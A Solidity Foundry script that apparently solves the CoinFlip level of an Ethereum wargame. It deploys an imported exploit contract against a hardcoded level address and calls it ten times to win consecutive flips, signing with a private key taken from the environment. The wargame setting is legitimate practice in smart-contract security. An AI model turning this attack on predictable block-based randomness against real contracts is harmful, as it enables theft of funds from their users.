// SPDX-License-Identifier: CC-BY-4.0
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {CoinFlip} from "src/03/CoinFlip.sol";
import {CoinFlipExploit} from "src/03/CoinFlipExploit.sol";


contract Exploit is Script {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    address levelInstance = 0xfC3A1c7Aaf80dAf711256cEa4d959722DbF2B5B1;
    CoinFlip level = CoinFlip(levelInstance);
    CoinFlipExploit exploit = new CoinFlipExploit(level);
 
    function run() public {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        uint256 count = 0;
        do {
            exploit.run();
            ++count;
        } while (count < 10);

        vm.stopBroadcast();
    }
}